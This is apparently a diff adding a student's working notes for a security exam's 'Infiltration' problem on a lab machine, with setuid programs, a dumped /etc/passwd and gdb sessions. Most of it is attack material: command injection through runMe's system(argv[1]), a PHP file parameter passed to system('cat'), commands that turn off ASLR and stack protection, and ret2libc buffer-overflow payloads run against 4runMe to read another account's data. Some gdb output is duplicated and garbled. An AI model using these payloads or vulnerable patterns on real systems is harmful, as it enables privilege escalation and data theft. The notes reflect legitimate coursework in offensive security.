@@ -51,3 +51,173 @@ data.txt from var/www/data.txt
 		In off-balance-sheet markets, be sure to divest from high-yield long positions.
 
 			
+Problem 1 - Infiltration [60 points + 10 extra]
+This problem focuses on the target machine at 10.241.13.81.
+
+Your goal is to get gain access to as many accounts as possible on the target machine without displaying gross negligence.(1)
+
+Please observe the following important notes as you proceed:
+
+For each owned account, credit will be based on the most privileged group to which it belongs:
+
+    monarch : 13 points
+    noble : 9 points
+    plebe : 4 point 
+
+1a - Hints
+
+    One of the accounts has user lab and password labuser.
+    The ftp server is vulnerable. 
+
+The source code for 5runMe is: 
+	
+#include <cstdlib>
+ 
+int main() {
+  system("less /var/tmp/blank.txt");
+}
+
+============================================================================
+ballsnazzy  bluefoggy  cookbee  ftper  lab  missionmug  railsfax  seetow  yohanan
+
+============
+
+gcc stackSmash.c -o vuln -fno-stack-protector -m32
+
+  
+echo 0 > /proc/sys/kernel/randomize_va_space
+g++ -m64 -g -fno-stack-protector -z execstack -o hw5_1a hw5_1a.cpp
+ 
+gdb -tui bof
+set disable-randomization on
+(gdb) set disassembly-flavor intel
+(gdb) layout asm 
+
+
+=====
+
+/home$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+messagebus:x:101:105::/var/run/dbus:/bin/false
+colord:x:102:106:colord colour management daemon,,,:/var/lib/colord:/bin/false
+ntp:x:103:109::/home/ntp:/bin/false
+avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+usbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/false
+pulse:x:106:113:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:107:115:RealtimeKit,,,:/proc:/bin/false
+saned:x:108:116::/home/saned:/bin/false
+lab:x:1000:1000:Dr. Lab User,,,:/home/lab:/bin/bash
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
+ftper:x:1001:1004:Chemicistry Ftper,,,:/home/ftper:/bin/bash
+seetow:x:1002:1005:C. Tow,,,:/home/seetow:/bin/bash
+railsfax:x:1003:1006:Rails Fax,,,:/home/railsfax:/bin/bash
+missionmug:x:1004:1007:Mission Mug,,,:/home/missionmug:/bin/bash
+bluefoggy:x:1005:1008:Mr. Blue Foggy,,,:/home/bluefoggy:/bin/bash
+cookbee:x:1006:1009:,,,:/home/cookbee:/bin/bash
+ballsnazzy:x:1007:1010:,,,:/home/ballsnazzy:/bin/bash
+yohanan:x:1008:1011:MBY,,,:/home/yohanan:/bin/bash
+
+---------------------
+
+lab labuser
+lab@crunchbang:~$ cat data.txt
+You are now taking a final exam.
+
+
+-r-sr-xr-x 1 railsfax   railsfax    5834 Dec 14  2014 2runMe
+-r--r--r-- 1 railsfax   railsfax     287 Dec 14  2014 2runMe.C
+-r-sr-xr-x 1 missionmug missionmug  5776 Dec 14  2014 3runMe
+-r-sr-xr-x 1 bluefoggy  bluefoggy  14071 Dec 16  2014 4runMe
+-r--r--r-- 1 bluefoggy  bluefoggy    137 Dec 16  2014 4runMe.C
+-r-sr-xr-x 1 cookbee    cookbee     5096 Dec 16  2014 5runMe
+-r--r--r-- 1 cookbee    cookbee       72 Dec 16  2014 5runMe.C
+-rwxr-xr-x 1 lab        lab         6094 Dec  3 15:33 a.out
+-r-------- 1 lab        lab           33 Dec 12  2014 data.txt
+-rwxr-xr-x 1 lab        lab         5559 Dec  3 12:25 getenvaddress
+-rw-r--r-- 1 lab        lab          393 Dec  3 12:24 getenvaddress.c
+-rw-r--r-- 1 lab        lab          128 Dec  3 15:33 plus.C
+-rwxr-xr-x 1 lab        lab         6094 Dec  3 15:34 plus.out
+-r-sr-xr-x 1 seetow     seetow      5071 Dec 14  2014 runMe
+-r--r--r-- 1 seetow     seetow        74 Dec 14  2014 runMe.C
+
+
+lab@crunchbang:~$ cat runMe.C
+#include <cstdlib>
+int main(int argc, char **argv) {
+  system(argv[1]);
+}
+
+./runMe "cat /home/seetow/data.txt"
+The 1992 Merlot from Pepsi Vineyards mixes magnetic halibut undertones with a oaty onion essence.
+
+cat 2runMe.C
+#include <cstdlib>
+#include <cstdio>
+
+int main() {
+  int incorrect = 1;
+  char password[10];
+  
+  printf("What is the password?\n");
+  scanf("%s",password);
+
+  if (incorrect) {
+    printf("Wrong ... sorry\n");
+    return -1;
+  }
+  else {
+    system("cat /home/railsfax/data.txt");
+  }
+}
+
+------
+entered in url: http://10.241.13.81/index.php?file=*
+?
+if ($_GET['file']) {
+   print "file: ".$_GET['file']."\n";
+   print system("cat ".$_GET['file']);
+}
+?
+----
+
+Breakpoint 1, main (argc=2, argv=0xbffff7a4) at runMe4.C:17
+17	runMe4.C: No such file or directory.
+(gdb) p &exit
+$1 = (<text variable, no debug info> *) 0xBreakpoint 1, main (argc=2, argv=0xbffff7a4) at runMe4.C:17
+17	runMe4.C: No such file or directory.
+(gdb) p &exit
+$1 = (<text variable, no debug info> *) 0xb7d68270 <exit>
+(gdb) p &system
+$2 = (<text variable, no debug info> *) 0xb7d74c30 <system>b7d68270 <exit>
+(gdb) p &system
+$2 = (<text variable, no debug info> *) 0xb7d74c30 <system>
+
+lab@crunchbang:~$ ./4runMe $(python -c 'print "a" *22 + "\xb7\xd7\x4c\x30"[::-1] + "\xb7\xd6\x82\x70"[::-1] + "\xbf\xff\xff\x78"[::-1]')
+sh: 1: /home/bluefoggy/data.txt: Permission denied
+
+./getenv NVMHACK 4runMe
+NVMHACK will be at 0xbfffff79
+lab@crunchbang:~$ ./4runMe $(python -c 'print "a" *22 + "\xb7\xd7\x4c\x30"[::-1] + "\xb7\xd6\x82\x70"[::-1] + "\xbf\xff\xff\x5b"[::-1]')
+lab@crunchbang:~$ ./4runMe $(python -c 'print "a" *22 + "\xb7\xd7\x4c\x30"[::-1] + "\xb7\xd6\x82\x70"[::-1] + "\xbf\xff\xff\x79"[::-1]')
+sh: 1: /home/bluefoggy/data.txt: Permission denied
+lab@crunchbang:~$ ./4runMe $(python -c 'print "a" *22 + "\xb7\xd7\x4c\x30"[::-1] + "\xb7\xd6\x82\x70"[::-1] + "\xbf\xff\xff\x75"[::-1]')
+The impressionism of mobility is rather open-minded in its empiricism.
